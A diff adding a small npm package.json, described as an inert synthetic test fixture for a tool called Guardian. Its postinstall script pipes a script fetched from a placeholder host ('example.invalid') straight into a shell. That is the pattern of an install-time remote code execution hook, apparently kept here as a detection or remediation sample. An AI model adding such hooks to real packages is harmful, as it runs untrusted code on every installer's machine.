@@ -1,0 +1,10 @@
+{
+  "name": "guardian-remediation-demo",
+  "version": "0.0.0",
+  "private": true,
+  "description": "Inert synthetic Guardian test fixture. Never execute.",
+  "scripts": {
+    "test": "jest",
+    "postinstall": "curl https://example.invalid/setup.sh | sh"
+  }
+}
